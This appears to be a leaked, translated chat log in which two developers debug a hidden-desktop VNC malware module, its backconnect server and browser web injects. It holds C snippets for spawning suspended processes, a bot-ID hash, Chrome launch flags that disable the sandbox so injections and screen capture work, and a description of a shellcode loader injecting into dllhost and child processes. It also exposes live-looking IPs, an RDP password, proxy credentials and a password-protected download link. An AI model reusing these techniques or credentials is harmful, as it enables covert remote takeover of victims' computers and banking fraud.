[12.08.21 18:14:51] jaime: Hi.
[12.08.21 18:14:58] grem: hi
[12.08.21 18:15:28] jaime: can you outline the vnc and inject situation? :) What's the environment variable to check? :)
[12.08.21 18:22:08] grem: You set the name of environment variable there at initialization
Before starting a child process, an environment variable with the name specified at startup is created and deleted after startup
```
if (!WithBot)
        {
                SetEnvironmentVariableA(g_VncVar.VncPack->Config.HDeskEnv, "true");
        }
        

        Status = CreateProcessA(0, CmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        if (!WithBot)
        {
                SetEnvironmentVariableA(g_VncVar.VncPack->Config.HDeskEnv, 0);
        }

```
[12.08.21 18:43:46] jaime: How do I get the variable name?
[12.08.21 18:47:17] jaime: I do not pass the name through Start, only the name of the module and config
[12.08.21 18:48:17] grem: I did not know ip-machine as an environment variable, cesar probably already changed this behavior, but not for sure.
in general, need to decide on a name or maybe it should be generated by something and send from the backconnect
[12.08.21 18:49:38] jaime: So if some environment variable is set, I ignore the desktop name check? While I do not understand what is the problem :)
[12.08.21 18:52:30] jaime: Caesar is not visible, no advice
[16.08.21 10:20:16] jaime: Hi.
[16.08.21 10:20:26] grem: hi
[16.08.21 10:20:39] jaime: help me with vnc :)
[16.08.21 10:21:49] jaime: xfreerdp /u:administrator /p:XOge1FTv /w:1366 /h:768 /proxy:http://9CF0EF54:D41EE85C@45.89.106.78:8082/ /v:45.89.106.78:8083
[16.08.21 10:22:14] jaime: I specify proxy with authorization and ip to connect
[16.08.21 10:22:40] jaime: Telnet does not connect to proxy at once
[16.08.21 10:22:44] grem: what is the address of the parameter page?
I don't know how they did it, but web api of backconnect displays address of the machine where the module is deployed and login with passwords
[16.08.21 10:23:09] jaime: 195.123.212.155 was like this
[16.08.21 10:23:30] grem: 195.123.212.155 - this ip should be specified
[16.08.21 10:23:41] grem: backconnect was deployed on it
[16.08.21 10:23:55] jaime: Is it the same proxy?
[16.08.21 10:24:14] grem: hardly.
[16.08.21 10:32:24] jaime: Can you connect to bot 1230978706 ?
[16.08.21 10:33:48] jaime: What's your username?
[16.08.21 10:34:11] jaime: Proxy authorization is passed
[16.08.21 10:36:55] grem: what's your username when you connect directly?
[16.08.21 10:37:24] grem: only a separate password is specified
[16.08.21 10:39:37] jaime: So which client do you recommend? Let's go step by step. :)
[16.08.21 10:43:01] grem: I can't tell you here.
The author advises to use UltraVNC and RealVNC, and also TightVNC, but it is kind of slow.
And there is also an option to deploy NoVNC webpanel, I assume those who took sources from it were using it mostly.
[16.08.21 10:54:46] jaime: Got TightVNC
[16.08.21 10:54:57] jaime: It only has IP and port
[16.08.21 10:56:17] grem: Under *nix there was also TigerVNC
don't know which is better - worse.
[16.08.21 10:56:58] jaime: Do you need a proxy at all? Can I connect to IP port at once?
[16.08.21 10:58:33] grem: It's probably safer to use soxes, but you can connect to port 8083 directly
[16.08.21 11:20:53] jaime: viewer collapses, login goes through authorization and everything closes
[16.08.21 11:37:22] grem: maybe the problem is in the viewer itself?
There is a realVNC for linux
https://www.realvnc.com/en/connect/download/viewer/linux/
There's only one thing, you have to set the Color parameter to rgb888
[16.08.21 12:00:28] jaime: thanks for that. :) it worked.
[16.08.21 14:16:56] jaime: How do you run chrome under vnc?
[16.08.21 14:17:20] jaime: I get sweary about --no-sandbox even though I don't set it
[16.08.21 14:19:12] grem: I didn't even check that
it must run with the keys
[16.08.21 14:24:52] jaime: I even run it from the command line and still get the key from somewhere
[16.08.21 14:38:02] grem: probably intercepts process startup by hook and starts it with keys
[16.08.21 15:37:48] jaime: Who intercepts?
[16.08.21 15:37:56] jaime: Nothing works for me. :)
[16.08.21 15:38:16] jaime: I can't inject into chrome process running under vnc
[16.08.21 15:39:48] grem: vnc
[16.08.21 15:40:54] jaime: I kill chrome and start it with right keys.
[16.08.21 15:41:18] jaime: But it runs on wrong desktop
[16.08.21 15:41:52] jaime: If I save desktop settings and upload to the one I killed, nothing happens.
[16.08.21 15:43:54] grem: vnc runs chrome with keys to disable hardware acceleration, otherwise you can't rob pixels from the window.
[16.08.21 15:44:17] jaime: I'm disabling a bunch of protocols there :)
[16.08.21 15:45:31] grem: ``
--ash-force-desktop --disable-3d-apis --disable-accelerated-layers
--disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11
--disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling
 --aura-no-shadows --no-sandbox --no-zygote
```
[16.08.21 15:47:39] jaime: I also add this --disable-http2 --use-spdy=off --disable-quic --enable-logging --log-level=0
[16.08.21 15:51:02] jaime: Is this normal destcop name {F1D94A6B-2B17-D98C-0C92-E4282A15E079}?
[16.08.21 16:31:39] grem: --no-sandbox has no effect on injections?
[16.08.21 17:57] jaime: It shouldn't. It's very strange.
[16.08.21 17:18:03] jaime: I don't get it.
[30.08.21 12:45:38] jaime: Hi.
[30.08.21 12:46:02] jaime: By vnc is it for you? :)
[01.09.21 12:29:41] jaime: Hi. :)
[01.09.21 12:32:35] grem: hi.
[01.09.21 12:44:19] jaime: Do you understand the essence of the problem? If you offer a solution on my part, I'll try to do, I can not come to mind.
[01.09.21 12:44:52] jaime: I restart my browser for the injection by adding the right keys to the command line.
[01.09.21 12:45:26] jaime: Probably process changes PID and vnc doesn't kill it
[01.09.21 12:46:21] grem: vnc doesn't store pid
[01.09.21 12:46:21] jaime: you can start it with required keys directly from vnc and leave it untouched
[01.09.21 12:47:12] jaime: And how does it terminate chrome? On the command line? I went in via HDESK launched chrome, which chrome will it kill when it closes?
[01.09.21 12:47:54] jaime: I will see if I have the keys I need and won't touch it.
[01.09.21 12:48:32] jaime: Although it sucks that if I need to change the keys I will have to rebuild two programs
[01.09.21 13:22:00] grem: the vnc module injects itself into the process and creates an event when it kills the current process
[01.09.21 13:26:10] jaime: What should I do?
[01.09.21 13:27:23] jaime: I see process monitor, kill chrome, restart with right keys and inject :) I also run it on the dextop I killed it on.
[01.09.21 13:28:33] jaime: The only option I see is that you start it with the keys I need and I don't trace it if it already has the keys.
[01.09.21 13:31:38] grem: The keys must have changed
The old vnc just killed all browser processes before starting the new one
[01.09.21 13:37:09] jaime: I need these --disable-http2 -use-spdy=off --disable-quic
[01.09.21 13:37:32] jaime: Go ahead if I see them then don't touch them
[02.09.21 08:04:33] jaime: Hi.
[02.09.21 08:04:51] jaime: You did not add the keys to the new release?
[02.09.21 08:04:59] grem: hi
[02.09.21 08:05:12] grem: added to the release for bk
[02.09.21 08:05:51] grem: and for trik you have to wait for cesar to update
[02.09.21 08:06:06] jaime: Is there any way I can check it locally?
[02.09.21 08:07:46] grem: do you only need module? or backconnect too?
[02.09.21 08:08:27] jaime: I want to run on virtual machine and connect to it vnc. Is it possible?
[02.09.21 08:10:11] grem: you need virtual machine with win for the module and virtual machine with linux for backconnect
[02.09.21 08:10:37] jaime: Basically everything is there
[02.09.21 08:14:05] jaime: Have you already updated Caesar? I can in principle wait and have a look from the tree
[02.09.21 08:19:59] grem: ``
Download: https://qaz.im/load/aTyEbk/nythBZ
Delete: https://qaz.im/index.php?a=delete&q=1982650069
Password: x^394rYi2RnEm452
```
[02.09.21 08:20:50] grem: backconnect has to be built from sources
[02.09.21 08:21:10] grem: > Have you already uploaded an update to Caesar?
yes
[02.09.21 08:39:03] jaime: Thanks. Got it
[02.09.21 14:58:07] grem: I forgot to tell you
you have to download GeoLite2-City.mmdb before you install it
in archive empty stub instead of it.
[02.09.21 15:12:18] jaime: Yeah thanks
[02.09.21 15:12:25] jaime: I'm looking at it through Tric.
[02.09.21 15:12:36] jaime: I'm having trouble at 7.
[02.09.21 15:12:50] jaime: Chrome doesn't render
[02.09.21 15:13:09] jaime: Process runs but nothing under vnc
[02.09.21 15:14:55] jaime: With 10 everything is fine. Same with module
[02.09.21 15:15:29] jaime: Under 7 it was rendered once and then not
[17.09.21 14:35:27] grem: hi
[17.09.21 14:35:38] jaime: hi!
[17.09.21 14:35:59] jaime: Did you read the client's wishes on the channel? :)
[17.09.21 14:36:58] jaime: Do you have a way to distinguish which mode the application is running in?
[17.09.21 14:38:01] grem: Yes.
I wrote about this piece of code once before:
```
if (!WithBot)
        {
                SetEnvironmentVariableA(g_VncVar.VncPack->Config.HDeskEnv, "true");
        }
        

        Status = CreateProcessA(0, CmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        if (!WithBot)
        {
                SetEnvironmentVariableA(g_VncVar.VncPack->Config.HDeskEnv, 0);
        }
```
that is, you need to read with which environment variables the process was started
[17.09.21 14:39:21] jaime: Yes I saw that. What's the name of the variable? Config.HDeskEnv?
[17.09.21 14:40:42] grem: in the last module for tric is now hold, and for bk is test
[17.09.21 14:41:45] grem: the first builds had ip machine
[17.09.21 14:42:57] grem: but in general, ask cesar for sure
[17.09.21 14:43:53] jaime: There are 3 modes HDESK, normal, TMP and BOT. By hold, I understand that under you running, but how do I know BOT, TMP, or simple HDESK?
[17.09.21 14:45:19] jaime: WithBot - is this exactly the checkbox for BOT?
[17.09.21 14:48:02] jaime: If you set variable hold or with IP, is it running HDESK or HDESK TMP?
[17.09.21 14:48:15] grem: apparently yes
there's also this piece:
```
if (Param->WithBot)
        {
                char VarName[24];

                wsprintfA(VarName, "v%u", Param->BotId);

                SetEnvironmentVariableA(VarName, 0);
        }
```
bot id hash is used there as environment variable
[17.09.21 14:49:53] jaime: Yeah, got it, thanks. I'll take a look. :)
[17.09.21 15:02:01] grem: The hash goes like this:
```
#define FNV_32_PRIME 0x01000193

DWORD Hash_FNV1a(IN char* Str)
{
        DWORD Hash = 0x811c9dc5;

        while (*Str)
        {
                Hash ^= (DWORD)*Str++;
                Hash *= FNV_32_PRIME;
        }

        return Hash;
}
```
[17.09.21 15:13:51] jaime: lock visible, but no hash
[17.09.21 15:14:36] jaime: hold
[17.09.21 15:17:07] jaime: hold, not enough, just what you need.
[03.11.21 08:40:38] grem: hi
[03.11.21 08:40:45] jaime: hi. :)
[03.11.21 08:41:38] jaime: Such a question yesterday Robin gave a couple of links to access, there in hdesk did not set hold=true variable, looked in cmd
[03.11.21 08:41:48] jaime: Any idea what could have happened?
[03.11.21 08:42:02] jaime: Now unfortunately access is not working
[03.11.21 08:42:39] grem: no
[03/11/21 08:43:32] jaime: He had injections going into hdesk. Windows 10 was normal.
[03.11.21 08:48:01] grem: so the problem is exactly in the module for tric?
did you ask cesar?
Maybe he changed something?
Just did an update with padding randomization, maybe they changed something else
[03.11.21 08:48:50] jaime: Yes in the module for tric. No I didn't ask yesterday, it was late.
[03.11.21 08:51:14] jaime: Can you check it out? There is vnc.
[03.11.21 08:51:52] grem: cesar has a copy of the source code, he's basically responsible for the trike builds
[03.11.21 08:52:20] jaime: Oh! :)
[11.11.21 09:09:54] grem: hi
[11.11.21 09:09:59] jaime: hi! :)
[11.11.21 09:10:47] jaime: Can you tell me what's up with the vpc in the git? I see a clean project! :)
[11.11.21 09:11:02] jaime: When cloning 403
[11.11.21 09:11:08] grem: completely clean?
[11.11.21 09:11:16] jaime: yeah! :)
[11.11.21 09:12:02] jaime: Maybe because of 403?
[11.11.21 09:12:03] grem: now he raised the role
[11.11.21 09:12:46] jaime: Oh it's ok now!
[11.11.21 09:13:12] jaime: It must be either a glitch or it's not registered yet
[11.11.21 09:14:16] grem: no, I just put the guest role, apparently he has almost nothing available.
changed it to developer.
[11.11.21 09:33:03] jaime: And you can add libraries from darkcatvnc\VNC\src\LIB I have ntdll-64.lib but dxguid-64.lib is missing
[11.11.21 09:34:20] grem: I might not have put everything into git, I have to check how it's built
[11.11.21 09:35:21] jaime: Not everything is okay
[11.11.21 09:35:28] jaime: there is an error on linking
[11.11.21 09:36:58] jaime: didn't you modify lib_sock.c?
[11.11.21 09:37:32] grem: I don't think so
[11.11.21 09:38:48] jaime: coding plz ntdll-64.lib and dxguid-64.lib :)
[11.11.21 09:41:05] grem: all laminated
[11.11.21 09:55:46] jaime: I'll distract you again. :) is there any loider for this dll?
[11.11.21 09:56:10] jaime: You can connect only through the server?
[11.11.21 09:57:53] grem: I redid the loeder from the old VNC, it is in StartVNCSRV
but to connect, you have to build backconnect under linux
[11.11.21 09:58:19] jaime: yeah, that's how I know :)
[11.11.21 10:29:14] jaime: Lowder loads dllc. I fall out in VncEntry, there's garbage in the arguments. Did I build something wrong?
[11.11.21 10:37:20] grem: are you building a debug version now?
[11.11.21 10:37:48] jaime: yeah
[11.11.21 10:38:50] jaime: there's Debug, Release and Test
[11.11.21 10:39:33] grem: well, sometimes we forgot to copy the header
and there's also vnc_data_dbg.c removed from the build now
that is, if you take debug files they should be renamed
[11.11.21 10:39:47] jaime: I haven't found echroget Control, Start and other.
[11.11.21 10:40:22] grem: which profile did you build?
[11.11.21 10:40:40] jaime: I changed the name in loader to vnc_64_dbg.dll in the vnc build path
[11.11.21 10:40:52] jaime: I was building debug
[11.11.21 10:41:13] jaime: That's where vncEntry entry point is
[11.11.21 10:41:43] jaime: I get into VncEntry when I call LoadLibrary
[11.11.21 10:41:57] jaime: It seems like I built VNC not for Trick
[11.11.21 10:42:31] grem: did you read the readme.txt?
[11.11.21 10:43:01] jaime: yes i did
[11.11.21 10:43:54] grem: are you loading dll from tmp or what?
[11.11.21 10:45:16] jaime: yeah. got it. :)
[11.11.21 10:48:21] grem: you first build the shellcode loader and the basic vnc logic for both architectures.
These 4 modules with ramps are stitched into an array with ramps empty space for settings in the beginning.
In the output you take 2 vnc_data.c/.h files and with them you already build a working module
[11.11.21 10:49:28] grem: blew it
[11.11.21 10:50:11] jaime: Not ok! :)
[11.11.21 10:52:41] jaime: What does config.txt need? :)
[11.11.21 10:53:09] grem: backconnect ip address
[11.11.21 10:53:28] grem: or pads
[11.11.21 11:54:41] jaime: And how do you debug?
[11.11.21 11:54:41] jaime: It's not convenient.
[11.11.21 11:57:51] grem: I just watch the output in the log.
and for vnc you can use debugview++
[11.11.21 12:03:44] grem: plus I haven't made any significant changes yet, so far most of the changes were made by cesar.
[11.11.21 13:56:43] jaime: I put everything together in one, refused to package this code. You can have everything in the studio.
[11.11.21 13:57:27] jaime: There are questions about HookType == VNC_ENTRY_HOOK_NONE what is it? What is it for!
[11.11.21 13:57:53] jaime: VncPack->Config.VncPid what to pass here?
[11.11.21 13:58:14] jaime: that's probably it! :)
[11.11.21 14:00:06] jaime: I don't like in lib_sock blocked connect and rcv, I think there can be problems because of unstable pads
[11.11.21 14:05:09] grem: there are 4 modules in one array
the first 24 bytes are springboards for x86/x64 to the loader you need
next 100 bytes under the settings and then binary.
In the main module, we pass all the settings you need into this array and run it as a shellcode, later this array is moved in memory, when you connect to vncviewer, this array is injected into a new dllhost process with different settings, and when you run any child processes, also injected into them with the third settings.
[11.11.21 14:06:41] grem: hooks are put there to block start of some dll and call of some functions.
[11.11.21 14:07:08] jaime: Hooks are optional?
[11.11.21 14:07:50] grem: they are for browsers mostly
[11.11.21 14:09:07] grem: also there are some hacks for wow64
[12.11.21 09:46:25] jaime: hi.
[12.11.21 09:46:54] jaime: Hi!
[12.11.21 09:47:04] grem: hi.
[12.11.21 09:47:28] jaime: Do you know how to build module for uk? It should just run through rundll, right?
[12.11.21 09:48:46] grem: and I've written everything in readme.txt, are there separate build profiles, or are there none?
> It's just supposed to run through rundll, right?
yes
[12.11.21 09:50:43] jaime: Yeah found it, looked in the wrong place. Got it. Thanks. :)
[12.11.21 09:50:49] jaime: thanks.
[12.11.21 10:36:12] jaime: Solushin has no such profiles for some reason, and the project does
[12.11.21 10:36:58] grem: I didn't update .sln
[16.11.21 09:04:09] jaime: hi.
[16.11.21 09:26:58] grem: hi
[16.11.21 09:32:00] jaime: I added the host port setting. Let me put it in a separate branch, you'll cram it, and if you like it, you'll put it into the main branch. :)
[16.11.21 09:33:28] grem: I don't mind
[16.11.21 09:34:00] jaime: There's literally a couple of files, if you don't set anything, everything will be the same as before.
[16.11.21 09:34:05] jaime: I'll set it up
[16.11.21 09:42:09] jaime: I made jaime_research branch with 3 files changed, entry.h, entry.c and proto_bc.c
[16.11.21 11:38:33] grem: Did you also fill in the ubuntu fix?
Has the formatting changed there?
[16.11.21 12:03:15] grem: rewrote the parser a bit
[16.11.21 13:11:54] jaime: great.
[16.11.21 13:12:37] jaime: yeah a separate commit for ubuntu, I changed the line feeds to unux style everywhere
[16.11.21 13:15:42] jaime: I added automake, autoconf and fixed some small things there, I think you can leave it alone. There's essentially nothing there. If only Makefile.am, src/Makefile.am, bootstrap, configure.ac move to the main branch they are not there. Don't care about the rest.
[12/31/221 07:54:31] jaime: Hi! Happy New Year to you! :) I've added a few changes on the vnsserver there, in particular the build through docker. You can not even this year! :)
[31.12.21 07:55:28] grem: hi
[31.12.21 07:55:32] grem: ok
[31.12.21 07:55:52] grem: happy holidays to you too
[12/31/221 07:56:05] jaime: :) thank you!
